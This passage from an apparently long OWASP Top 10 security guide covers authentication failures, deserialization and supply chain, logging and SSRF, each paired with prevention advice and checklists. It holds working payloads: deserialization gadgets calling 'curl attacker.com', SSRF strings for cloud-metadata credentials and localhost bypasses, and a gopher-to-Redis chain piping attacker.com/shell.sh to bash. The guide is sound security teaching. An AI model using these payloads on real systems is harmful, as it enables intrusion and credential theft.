2. Attacker sends victim: https://app.com/login?SESS=abc123
3. Victim authenticates — server associates abc123 with victim's account
4. Attacker uses abc123 — now authenticated as victim
```

**Prevention:** Regenerate the session ID upon successful authentication.

**Session prediction:** Weak session ID generation allows prediction. Session IDs must be at least 128 bits of cryptographic randomness.

**Insufficient timeout:** Sessions that never expire allow long-term session hijacking from shared/public computers. Implement idle timeout (15-30 minutes for sensitive apps) and absolute timeout (8-24 hours).

### MFA Bypass Techniques

1. **SIM swapping:** Social-engineering the mobile carrier to transfer the victim's number.
2. **Real-time phishing:** Proxy tools (Evilginx, Modlishka) relay MFA codes in real-time.
3. **MFA fatigue/push bombing:** Sending repeated push notifications until the victim accepts.
4. **Recovery code theft:** If recovery codes are stored insecurely.
5. **SS7 interception:** Intercepting SMS OTPs via SS7 protocol vulnerabilities.

**Mitigation:** Prefer FIDO2/WebAuthn over SMS/TOTP. Implement number matching for push notifications. Rate-limit MFA attempts.

### Password Policy — NIST 800-63B

Key guidelines that differ from legacy best practices:

| Legacy Practice | NIST 800-63B Recommendation |
|----------------|----------------------------|
| Mandatory rotation every 90 days | Do NOT require periodic changes unless breach suspected |
| Complexity rules (upper+lower+digit+special) | Minimum 8 chars, check against breached password list |
| Security questions | Do NOT use knowledge-based authentication |
| SMS-based 2FA | Acceptable but "restricted authenticator" — prefer app/FIDO2 |

**Breached password check:**

```python
import hashlib
import httpx

def is_password_pwned(password: str) -> bool:
    """Check password against Have I Been Pwned API (k-anonymity)."""
    sha1 = hashlib.sha1(password.encode()).hexdigest().upper()
    prefix, suffix = sha1[:5], sha1[5:]
    resp = httpx.get(f"https://api.pwnedpasswords.com/range/{prefix}")
    return suffix in resp.text
```

### OAuth/OIDC Vulnerabilities

1. **Open redirect in `redirect_uri`:** If the authorization server does not strictly validate the redirect URI, an attacker can steal the authorization code.
2. **CSRF on OAuth callback:** Missing `state` parameter allows CSRF — attacker links victim's account to attacker's OAuth identity.
3. **Token leakage via referer:** Authorization codes in URL fragments or query params leaked via `Referer` header.
4. **Implicit flow token theft:** The implicit flow exposes tokens in the URL fragment. Use Authorization Code + PKCE instead.

### JWT Implementation Failures

1. **`alg: none` acceptance:** Server accepts unsigned tokens.
2. **HMAC/RSA confusion:** Server configured for RSA but accepts HMAC — attacker signs with the public key (known) using `HS256`.
3. **Missing `exp` validation:** Tokens without expiration never become invalid.
4. **`kid` injection:** The `kid` (Key ID) header is used in a file path or SQL query without validation.
5. **JWK header injection:** Attacker embeds their own public key in the `jwk` header and the server trusts it.

**Testing:**

```bash
# jwt_tool — comprehensive JWT testing
python3 jwt_tool.py <token> -M at  # All tests
python3 jwt_tool.py <token> -X a   # alg:none attack
python3 jwt_tool.py <token> -X k   # Key confusion attack
```

### Passwordless Authentication — FIDO2/WebAuthn

FIDO2 eliminates passwords entirely. The authenticator (hardware key, biometric) performs a public-key challenge-response:

```
1. Server sends challenge (random nonce)
2. Authenticator signs challenge with private key (stored in secure enclave)
3. Server verifies signature with registered public key
4. No shared secret ever transmitted
```

**Benefits:** Immune to phishing (origin-bound), credential stuffing (no password), and replay attacks (challenge is unique).

### Testing Checklist — A07

- [ ] Test for credential stuffing: verify rate limiting per account and per IP.
- [ ] Confirm session ID regenerated after login.
- [ ] Verify session timeout (idle + absolute).
- [ ] Test MFA bypass: check for backup code brute force, MFA fatigue.
- [ ] Verify password policy follows NIST 800-63B.
- [ ] Test OAuth `state` parameter is validated.
- [ ] Test JWT for `alg:none`, key confusion, missing `exp`.
- [ ] Confirm account lockout after N failed attempts (temporary, not permanent).

---

## A08:2021 — Software and Data Integrity Failures

New category in 2021, absorbing the former "Insecure Deserialization" (A08:2017) and adding CI/CD and supply chain concerns.

### CI/CD Pipeline Compromise

Attack vectors in the CI/CD pipeline:

```
┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐
│  Source   │───▶│  Build   │───▶│  Test    │───▶│  Deploy  │
│  Code     │    │  System  │    │  System  │    │  System  │
└──────────┘    └──────────┘    └──────────┘    └──────────┘
     │               │               │               │
  Poisoned       Malicious       Tampered        Unsigned
  commit         dependency      artifact        release
  (stolen SSH    (supply chain)  (cache poison)  (no hash
   key)                                          verification)
```

**Hardening:**

- Require signed commits (`git config --global commit.gpgsign true`).
- Pin CI runner images by digest, not tag.
- Use ephemeral build environments (destroy after each build).
- Require code review for CI/CD configuration changes.
- Store secrets in vault, not in CI environment variables visible to all jobs.

### Insecure Deserialization

When an application deserializes untrusted data, an attacker can modify the serialized object to achieve RCE, privilege escalation, or DoS.

**Java (ysoserial):**

```java
// VULNERABLE — deserializes user input
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject(); // Executes gadget chain from ysoserial
```

```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections6 "curl attacker.com/$(whoami)" > payload.bin
# Send to vulnerable endpoint
curl -X POST --data-binary @payload.bin https://target.com/api/import
```

**PHP (POP chains):**

```php
// VULNERABLE
$data = unserialize($_COOKIE['session_data']);
// Attacker crafts cookie with a POP chain targeting __destruct or __wakeup
```

**Python (pickle):**

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("curl attacker.com/$(whoami)",))

# Attacker serializes
payload = pickle.dumps(Exploit())

# VULNERABLE server deserializes
data = pickle.loads(untrusted_input)  # RCE
```

**Node.js (`node-serialize`):**

```javascript
// VULNERABLE
var serialize = require('node-serialize');
var payload = '{"exploit":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\',function(e,o){/* ... */})}()"}';
serialize.unserialize(payload); // RCE
```

**Prevention:**

- Never deserialize untrusted data. Use JSON, Protocol Buffers, or MessagePack.
- If deserialization is required, implement allowlisting of expected classes.
- Use integrity checks (HMAC) on serialized data before deserialization.

### Supply Chain Attacks — Case Studies

**SolarWinds (2020):** Attacker compromised the build system of SolarWinds Orion, injecting backdoor code (SUNBURST) into signed updates distributed to 18,000+ organizations, including US government agencies.

**CodeCov (2021):** Attacker modified the CodeCov Bash Uploader script by exploiting a Docker image creation process flaw. The script exfiltrated environment variables (credentials, tokens) from thousands of CI pipelines.

**ua-parser-js (2021):** Attacker hijacked the npm account of the maintainer and published versions 0.7.29, 0.8.0, and 1.0.0 with cryptominer and password-stealing malware. The package had 8M weekly downloads.

**Lessons:**

1. Verify signatures on all external software updates.
2. Pin dependencies by hash, not just version.
3. Monitor for unexpected dependency changes.
4. Implement egress filtering on build systems.

### SLSA Framework (Supply-chain Levels for Software Artifacts)

| Level | Requirements |
|-------|-------------|
| **SLSA 1** | Build process documented. Provenance generated. |
| **SLSA 2** | Build on hosted, authenticated service. Signed provenance. |
| **SLSA 3** | Hardened build platform. Non-falsifiable provenance. |
| **SLSA 4** | Two-person review. Hermetic, reproducible builds. |

### Code Signing

```bash
# Sign a release artifact with cosign (Sigstore)
cosign sign-blob --key cosign.key --output-signature release.sig release.tar.gz

# Verify
cosign verify-blob --key cosign.pub --signature release.sig release.tar.gz
```

### Testing Checklist — A08

- [ ] Verify CI/CD pipeline requires signed commits.
- [ ] Confirm build artifacts are signed and verified before deployment.
- [ ] Test for deserialization vulnerabilities on all endpoints accepting binary/serialized data.
- [ ] Verify no `pickle.loads`, `ObjectInputStream.readObject`, or `unserialize` on untrusted input.
- [ ] Check dependency integrity: lockfiles committed, hashes verified.
- [ ] Confirm auto-update mechanisms verify signatures.
- [ ] Review SBOM attestation process.

---

## A09:2021 — Security Logging and Monitoring Failures

Insufficient logging delays breach detection. The median time to detect a breach is 204 days (IBM Cost of a Data Breach Report 2023).

### What to Log

| Event Category | Examples |
|---------------|----------|
| **Authentication** | Login success/failure, password reset, MFA enrollment/bypass |
| **Authorization** | Access denied, privilege escalation attempt, role change |
| **Input validation** | Rejected input, WAF blocks, rate limit triggers |
| **High-value transactions** | Financial transfers, data export, bulk delete, admin actions |
| **System events** | Startup/shutdown, configuration change, certificate rotation |
| **Data access** | PII access, database query on sensitive tables (audit trail) |

**Structured logging example (Python):**

```python
import structlog
import datetime

logger = structlog.get_logger()

def log_auth_event(user_id: str, action: str, success: bool, ip: str, user_agent: str):
    logger.info(
        "auth_event",
        user_id=user_id,
        action=action,
        success=success,
        ip_address=ip,
        user_agent=user_agent,
        timestamp=datetime.datetime.now(datetime.timezone.utc).isoformat(),
    )
```

### Log Injection Prevention

If user input appears in log entries, an attacker can forge log lines:

```
# Attacker username:
admin\n2026-05-07 INFO Login successful user=admin

# Without sanitization, the log shows two entries:
2026-05-07 INFO Login failed user=admin
2026-05-07 INFO Login successful user=admin  ← forged
```

**Prevention:**

```python
# Sanitize log input
def sanitize_for_log(value: str) -> str:
    return value.replace('\n', '\\n').replace('\r', '\\r').replace('\t', '\\t')
```

Use structured/JSON logging instead of plaintext to eliminate injection entirely — newlines in field values are escaped by the JSON serializer.

### Centralized Logging Architecture

```
┌────────────┐    ┌────────────┐    ┌────────────┐
│ Application│    │ Application│    │ Application│
│  Server 1  │    │  Server 2  │    │  Server N  │
└─────┬──────┘    └─────┬──────┘    └─────┬──────┘
      │                 │                 │
      ▼                 ▼                 ▼
┌─────────────────────────────────────────────────┐
│          Log Aggregator / Shipper                │
│  (Fluentd, Fluent Bit, Filebeat, Vector)         │
├─────────────────────────────────────────────────┤
│          Message Queue (optional)                │
│  (Kafka, Redis Streams)                          │
├─────────────────────────────────────────────────┤
│          Log Storage & Search                    │
│  (Elasticsearch/OpenSearch, Loki, ClickHouse)    │
├─────────────────────────────────────────────────┤
│          Visualization & Alerting                │
│  (Grafana, Kibana, custom dashboards)            │
├─────────────────────────────────────────────────┤
│          SIEM Integration                        │
│  (Splunk, Sentinel, Chronicle, Elastic SIEM)     │
└─────────────────────────────────────────────────┘
```

### Alerting Rules

Define detection rules for security events:

```yaml
# Example: Elasticsearch Watcher rule for brute force
trigger:
  schedule:
    interval: "1m"
condition:
  compare:
    ctx.payload.hits.total: { gte: 10 }
input:
  search:
    request:
      indices: ["app-logs-*"]
      body:
        query:
          bool:
            must:
              - match: { event_type: "auth_event" }
              - match: { success: false }
            filter:
              - range:
                  "@timestamp":
                    gte: "now-5m"
        aggs:
          by_ip:
            terms:
              field: "ip_address.keyword"
              min_doc_count: 10
actions:
  notify:
    webhook:
      url: "https://alerts.example.com/security"
```

### Log Retention and Integrity

| Requirement | Guideline |
|------------|-----------|
| **Retention period** | Minimum 1 year for security logs (PCI-DSS: 1 year, available for 3 months). HIPAA: 6 years. |
| **Integrity** | Write-once storage, append-only streams, hash chains, or digital signatures on log batches. |
| **Access control** | Logs should be read-only for analysts. Only the logging infrastructure should write. |
| **Encryption** | Logs at rest encrypted. Logs in transit over TLS. |

### Compliance Requirements

| Standard | Logging Requirements |
|----------|---------------------|
| **PCI-DSS** | Log all access to cardholder data. Retain 1 year. Review daily. |
| **HIPAA** | Audit controls for ePHI access. Risk analysis required. |
| **SOC 2** | Log access events, changes, and security incidents. Monitor continuously. |
| **GDPR** | Log processing activities involving personal data. Right-to-erasure applies to logs containing PII. |

### Testing Checklist — A09

- [ ] Verify authentication events are logged (success and failure).
- [ ] Verify authorization failures are logged.
- [ ] Confirm high-value transactions are logged with before/after state.
- [ ] Test log injection: inject `\n` in username and verify logs are not corrupted.
- [ ] Verify centralized logging is active and receiving from all services.
- [ ] Confirm alerting rules exist for brute force, privilege escalation, anomalous access.
- [ ] Verify log retention meets compliance requirements.
- [ ] Confirm logs do not contain passwords, tokens, or full credit card numbers.

---

## A10:2021 — Server-Side Request Forgery (SSRF)

New in the Top 10 for 2021, despite lower incidence (2.72%), because of the high impact — especially in cloud environments where metadata endpoints grant temporary credentials.

### SSRF Basics

The application fetches a URL supplied by the user without proper validation:

```python
# VULNERABLE
import requests

@app.route("/fetch")
def fetch_url():
    url = request.args.get("url")
    resp = requests.get(url)  # Server-side request with no validation
    return resp.text
```

**Basic SSRF payloads:**

```
# Access cloud metadata
http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name

# Access internal services
http://localhost:8080/admin
http://internal-api.corp.local/users

# File protocol
file:///etc/passwd
```

### Blind SSRF

The response is not returned to the attacker, but the request is still made. Detection:

```
# Time-based: request to a controlled slow server
http://attacker.com/slow?delay=10

# OOB: DNS lookup to attacker-controlled domain
http://unique-id.burpcollaborator.net

# Port scanning: time difference between open/closed ports
http://internal-host:22 (fast reset) vs http://internal-host:8080 (connection)
```

### URL Parser Bypass

Different URL parsers interpret URLs differently. Exploit inconsistencies:

```
# Bypass "localhost" check
http://127.0.0.1
http://0x7f000001
http://0177.0.0.1          (octal)
http://2130706433           (decimal)
http://127.1                (short form)
http://[::1]                (IPv6 localhost)
http://0.0.0.0
http://localtest.me         (DNS resolves to 127.0.0.1)

# Bypass domain allowlist using URL parsing tricks
http://expected.com@attacker.com   (user@ component)
http://expected.com#@attacker.com  (fragment)
http://attacker.com\@expected.com  (backslash in some parsers)
```

**Python URL parsing inconsistency:**

```python
from urllib.parse import urlparse

# These parse differently across versions and libraries
urlparse("http://example.com@evil.com")
# scheme='http', netloc='example.com@evil.com', ...
# Some validation code checks "example.com" is in netloc — passes!
# Actual request goes to evil.com with "example.com" as username
```

### Protocol Smuggling

Use non-HTTP protocols via SSRF:

```
# Gopher — construct arbitrary TCP payloads
gopher://internal-redis:6379/_SET%20pwned%20true%0D%0A

# Dict protocol
dict://internal-redis:6379/SET:pwned:true

# TFTP
tftp://internal-server/file

# Using redirects to bypass protocol restrictions
# 1. Request: http://attacker.com/redirect
# 2. 302 → gopher://internal-redis:6379/...
```

### Cloud Metadata Exploitation

The most critical SSRF impact in cloud environments:

**AWS:**

```
# Instance Metadata Service v1 (no header required)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Returns temporary AWS credentials:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-05-08T00:00:00Z"
}
```

**GCP:**

```
# Requires header: Metadata-Flavor: Google
# But SSRF via server-side HTTP client may include it
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

**Azure:**

```
# Instance Metadata Service
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

**Prevention — IMDSv2 (AWS):**

IMDSv2 requires a PUT request to obtain a session token before metadata access. SSRF attacks that can only issue GET requests are blocked:

```bash
# IMDSv2 — two-step process
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

### SSRF to RCE Chains

1. **SSRF → Redis → RCE:** Use Gopher protocol to send Redis `CONFIG SET` commands, writing a cron job or SSH key:

```
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/spool/cron/%0D%0ACONFIG%20SET%20dbfilename%20root%0D%0ASET%20payload%20%22%5Cn%2A%20%2A%20%2A%20%2A%20%2A%20curl%20attacker.com/shell.sh%7Cbash%5Cn%22%0D%0ASAVE%0D%0A
```

2. **SSRF → Elasticsearch → Data exfiltration:** Access internal Elasticsearch cluster to dump indices.

3. **SSRF → Kubernetes API → Cluster takeover:** Access `https://kubernetes.default.svc` from a pod to interact with the API server.

4. **SSRF → Docker socket → RCE:** If the Docker socket is mounted, create a privileged container:

```
# POST to Docker socket via SSRF
http://localhost/var/run/docker.sock → POST /containers/create
```

### Prevention

**Allowlist-based approach (recommended):**

```python
from urllib.parse import urlparse
import ipaddress
import socket

ALLOWED_HOSTS = {"api.example.com", "cdn.example.com"}
BLOCKED_RANGES = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),  # Link-local / cloud metadata
    ipaddress.ip_network("::1/128"),
]

def validate_url(url: str) -> bool:
    parsed = urlparse(url)

    if parsed.scheme not in ("http", "https"):
        return False

    if parsed.hostname not in ALLOWED_HOSTS:
        return False

    # Resolve DNS and check against blocked ranges
    try:
        resolved_ips = socket.getaddrinfo(parsed.hostname, parsed.port or 443)
        for family, kind, proto, canonname, sockaddr in resolved_ips:
            ip = ipaddress.ip_address(sockaddr[0])
            for blocked in BLOCKED_RANGES:
                if ip in blocked:
                    return False
    except socket.gaierror:
        return False

    return True
```

**Network segmentation:** Place application servers in a network segment that cannot reach internal infrastructure, cloud metadata endpoints, or the management plane.

**DNS rebinding prevention:** Resolve the hostname once, validate the IP, then use the resolved IP for the actual request. Prevent TOCTOU between validation and request.

```go
func safeFetch(targetURL string) (*http.Response, error) {
    parsed, err := url.Parse(targetURL)
    if err != nil {
        return nil, err
    }

    // Resolve DNS once
    ips, err := net.LookupHost(parsed.Hostname())
    if err != nil {
        return nil, err
    }

    // Validate all resolved IPs
    for _, ipStr := range ips {
        ip := net.ParseIP(ipStr)
        if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() {
            return nil, fmt.Errorf("blocked: resolved to internal IP %s", ipStr)
        }
    }

    // Use custom dialer that pins to resolved IP
    dialer := &net.Dialer{}
    transport := &http.Transport{
        DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
            // Force connection to resolved IP
            port := parsed.Port()
            if port == "" {
                port = "443"
            }
            return dialer.DialContext(ctx, network, ips[0]+":"+port)
        },
    }

    client := &http.Client{
        Transport: transport,
        Timeout:   10 * time.Second,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            // Block redirects to prevent redirect-based bypass
            return http.ErrUseLastResponse
        },
    }

    return client.Get(targetURL)
}
```

### Testing Checklist — A10

- [ ] Test all URL-accepting parameters with internal IPs (127.0.0.1, 169.254.169.254).
- [ ] Test URL encoding/alternative IP representations (decimal, hex, octal, IPv6).
- [ ] Test protocol handlers: `file://`, `gopher://`, `dict://`.
- [ ] Test for blind SSRF with OOB interaction (Burp Collaborator, interactsh).
- [ ] Verify cloud metadata endpoints are blocked (IMDSv2 enforced on AWS).
- [ ] Test redirect-following behavior (does SSRF follow 302 to internal hosts?).
- [ ] Verify DNS rebinding protection is in place.
- [ ] Test with DNS names that resolve to internal IPs.

---

## Emerging Categories and Preparing for the Next Revision

The OWASP Top 10 is updated roughly every 3-4 years. Based on current trends, these areas are likely to gain prominence:

### API-Specific Vulnerabilities

The OWASP API Security Top 10 (2023) already exists as a parallel document. Key categories:

- **BOLA** (Broken Object-Level Authorization): API-specific IDOR, the #1 API vulnerability.
- **BFLA** (Broken Function-Level Authorization): Accessing admin API endpoints as a regular user.
- **Unrestricted Resource Consumption:** Missing rate limits, pagination, and query depth limits (especially GraphQL).
- **Server-Side Request Forgery:** Already in the Top 10 but expected to grow with webhook and integration patterns.

### AI/ML-Specific Threats

- **Prompt injection:** Manipulating LLM-integrated applications to execute unintended actions.
- **Training data poisoning:** Compromising model behavior by inserting malicious training data.
- **Model theft:** Extracting model weights via repeated API queries (model inversion).
- **Insecure output handling:** Trusting LLM output and passing it to system commands or database queries without validation.

The OWASP LLM Top 10 (2025) covers these categories.

### Software Supply Chain (Expanded)

- **Build provenance and SLSA adoption** becoming mandatory for critical infrastructure.
- **SBOM requirements** codified in regulation (US Executive Order 14028, EU Cyber Resilience Act).
- **Dependency lifecycle management** beyond just CVE scanning — evaluating maintainer risk, bus factor, and funding stability.

### Preparing Your Organization

1. **Adopt the OWASP ASVS** (Application Security Verification Standard) as your internal security requirements baseline. It maps directly to the Top 10 but provides much deeper control requirements at three levels (L1/L2/L3).

2. **Integrate OWASP Testing Guide v5** into your pentest methodology. It provides step-by-step procedures for testing every category.

3. **Run OWASP ZAP or Burp Suite** in CI pipelines for automated DAST. Use semgrep or CodeQL for SAST. Use Trivy, Grype, or Snyk for SCA.

4. **Train developers** on secure coding with OWASP Juice Shop (intentionally vulnerable application) and the OWASP WebGoat project.

5. **Measure and track** vulnerability density per category over time. Map findings to OWASP categories in your vulnerability management platform to identify systemic weaknesses.

---

## Cross-Category Detection Script

A lightweight Python script that demonstrates automated checks for common misconfigurations across multiple OWASP categories:

```python
#!/usr/bin/env python3
"""
OWASP Top 10 — Quick Configuration Auditor
Tests for common misconfigurations against a target URL.
For authorized security testing only.
"""

import sys
import httpx
from urllib.parse import urlparse

def check_security_headers(url: str) -> dict[str, str]:
    """A05: Check for missing security headers."""
    required_headers = {
        "Strict-Transport-Security": "Missing HSTS — SSL stripping possible",
        "Content-Security-Policy": "Missing CSP — XSS risk increased",
        "X-Content-Type-Options": "Missing X-Content-Type-Options — MIME sniffing",
        "X-Frame-Options": "Missing X-Frame-Options — clickjacking possible",
        "Referrer-Policy": "Missing Referrer-Policy — referer leakage",
    }
    findings = {}
    resp = httpx.get(url, follow_redirects=True, timeout=10)
    for header, msg in required_headers.items():
        if header.lower() not in {k.lower() for k in resp.headers}:
            findings[header] = msg
    return findings

def check_cors(url: str) -> str | None:
    """A01: Check for overly permissive CORS."""
    evil_origin = "https://evil.attacker.com"
    resp = httpx.get(url, headers={"Origin": evil_origin}, timeout=10)
    acao = resp.headers.get("Access-Control-Allow-Origin", "")
    if acao == evil_origin or acao == "*":
        creds = resp.headers.get("Access-Control-Allow-Credentials", "")
        return f"CORS reflects arbitrary origin: {acao} (credentials: {creds})"
    return None

def check_tls(url: str) -> str | None:
    """A02: Check if HTTP redirects to HTTPS."""
    parsed = urlparse(url)
    if parsed.scheme == "https":
        http_url = url.replace("https://", "http://", 1)
        try:
            resp = httpx.get(http_url, follow_redirects=False, timeout=10)
            if resp.status_code not in (301, 302, 307, 308):
                return "HTTP does not redirect to HTTPS"
            location = resp.headers.get("Location", "")
            if not location.startswith("https://"):
                return f"HTTP redirects but not to HTTPS: {location}"
        except httpx.ConnectError:
            pass  # HTTP port closed — acceptable
    return None

def check_information_disclosure(url: str) -> list[str]:
    """A05: Check for information leakage in headers and error pages."""
    findings = []
    resp = httpx.get(url, timeout=10)

    server = resp.headers.get("Server", "")
    if server and any(v in server.lower() for v in ["apache/", "nginx/", "iis/"]):
        findings.append(f"Server header reveals version: {server}")

    x_powered = resp.headers.get("X-Powered-By", "")
    if x_powered:
        findings.append(f"X-Powered-By reveals technology: {x_powered}")

    return findings

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target-url>")
        sys.exit(1)

    target = sys.argv[1]
    print(f"[*] Auditing: {target}\n")

    print("[A02] TLS Check")
    tls_finding = check_tls(target)
    if tls_finding:
        print(f"  [!] {tls_finding}")
    else:
        print("  [+] HTTPS redirect OK")

    print("\n[A01] CORS Check")
    cors_finding = check_cors(target)
    if cors_finding:
        print(f"  [!] {cors_finding}")
    else:
        print("  [+] CORS policy OK")

    print("\n[A05] Security Headers")
    header_findings = check_security_headers(target)
    if header_findings:
        for header, msg in header_findings.items():
            print(f"  [!] {msg}")
    else:
        print("  [+] All security headers present")

    print("\n[A05] Information Disclosure")
    info_findings = check_information_disclosure(target)
    if info_findings:
        for f in info_findings:
            print(f"  [!] {f}")
    else:
        print("  [+] No version/technology leakage in headers")

if __name__ == "__main__":
    main()
```

---

## Consolidated Reference Table

| Category | Key CWEs | Primary Tools | Prevention Summary |
|----------|----------|---------------|-------------------|
| **A01** Broken Access Control | CWE-200, 201, 352, 639 | Burp Authorize, ZAP Access Control | Server-side ownership checks, deny by default |
| **A02** Cryptographic Failures | CWE-259, 327, 328, 330 | testssl.sh, nmap ssl-enum-ciphers | TLS 1.2+, AES-GCM, Argon2id, secrets module |
| **A03** Injection | CWE-79, 89, 94, 78 | sqlmap, tplmap, Burp, semgrep | Parameterized queries, output encoding, input validation |
| **A04** Insecure Design | CWE-501, 522, 602, 840 | Threat Dragon, draw.io, IriusRisk | Threat modeling, abuse cases, secure SDLC |
| **A05** Security Misconfiguration | CWE-2, 11, 13, 611 | Nikto, Nuclei, ScoutSuite, Prowler | Hardened defaults, security headers, disable debug |
| **A06** Vulnerable Components | CWE-1035, 1104 | Snyk, Trivy, Grype, npm audit | SCA in CI, pin versions, SBOM, auto-update |
| **A07** Auth Failures | CWE-255, 287, 384, 798 | Hydra, jwt_tool, Burp | Rate limiting, NIST 800-63B, FIDO2, session mgmt |
| **A08** Integrity Failures | CWE-345, 502, 829 | ysoserial, marshalsec, cosign | No untrusted deserialization, signed artifacts, SLSA |
| **A09** Logging Failures | CWE-117, 223, 532, 778 | ELK, Grafana Loki, Splunk | Structured logging, centralized collection, alerting |
| **A10** SSRF | CWE-918 | Burp Collaborator, interactsh | URL allowlists, DNS validation, network segmentation |

---

## References

- OWASP Top 10:2021 — https://owasp.org/Top10/
- OWASP ASVS v4.0.3 — https://owasp.org/www-project-application-security-verification-standard/
- OWASP Testing Guide v5 — https://owasp.org/www-project-web-security-testing-guide/
- OWASP API Security Top 10 2023 — https://owasp.org/API-Security/
- OWASP LLM Top 10 — https://genai.owasp.org/
- NIST SP 800-63B — https://pages.nist.gov/800-63-3/sp800-63b.html
- RFC 9106 (Argon2) — https://www.rfc-editor.org/rfc/rfc9106
- RFC 8996 (TLS 1.0/1.1 Deprecation) — https://www.rfc-editor.org/rfc/rfc8996
- SLSA Framework — https://slsa.dev/
- CWE (Common Weakness Enumeration) — https://cwe.mitre.org/
- Sigstore / cosign — https://www.sigstore.dev/
